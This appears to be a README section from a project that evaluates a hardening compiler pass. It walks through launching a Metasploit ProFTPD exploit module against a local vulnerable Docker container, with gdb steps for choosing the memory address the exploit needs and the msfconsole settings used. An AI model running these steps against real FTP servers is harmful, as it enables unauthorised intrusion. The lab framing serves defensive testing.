## Running the `proftp_sreplace_getkey` exploit

1. Build and run the images.
```sh
docker build -t vuln-proftpd -f vulnTarget.Dockerfile .
docker run -d --name vuln-target vuln-proftpd
docker build -t hardened-proftpd -f hardenedTarget.Dockerfile .
docker run -d --name hardened-target hardened-proftpd
```
2. Exec into the container (`vuln-target` for the original ProFTPD version, and `hardened-target` for the one compiled with the pass).
```
docker exec -it --privileged vuln-target bash
```
2. In the container, run `gdb -p $(pgrep -f 'proftpd.*accepting')` to get the required memory address for the exploit.
```gdb
(gdb) i proc m

# Pick the data section of one library, for example:
0xb7677000 0xb767e000     0x7000   0x1a2000 /lib/i386-linux-gnu/libcrypto.so.1.0.0

# Also, make sure it doesn't have any zero bytes, so add 1 to it
# 0xb7677000, getting 0xb7677001
```
3. Run `msfconsole` and:
```
use exploit/windows/ftp/proftp_sreplace_getkey
set rhost 127.0.0.1
set non_empty_high 0xb7677001
exploit
```
